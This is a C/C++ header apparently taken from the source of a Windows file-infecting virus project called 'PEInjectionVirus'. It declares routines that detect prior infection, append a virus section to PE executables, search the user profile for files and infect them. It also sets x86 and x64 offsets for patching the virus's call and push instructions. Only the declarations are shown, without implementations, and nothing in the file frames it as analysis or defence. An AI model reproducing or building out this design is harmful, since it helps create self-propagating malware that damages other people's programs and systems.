#pragma once

#ifndef PEINJECTIONVIRUS_INCLUDE_VIRUS_VIRUS_H_
#define PEINJECTIONVIRUS_INCLUDE_VIRUS_VIRUS_H_

#include "ulti/everything.h"
#include "pe/pe.h"

constexpr DWORD DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86 = 0x43;
constexpr DWORD DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_PUSH_VIRUSFUNCTION_X86 = 0x34;

constexpr DWORD DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64 = 0x5f;

BYTE WINAPI IsVirusExistedInFile(const PVOID file_data);

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size);
PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD size, const PDATA data);

void WINAPI InfectUserProfile(const PDATA data);
void WINAPI FindFile(PSTR directory, const PDATA data);
void WINAPI InfectFile(PSTR file_name, const PDATA data);

#endif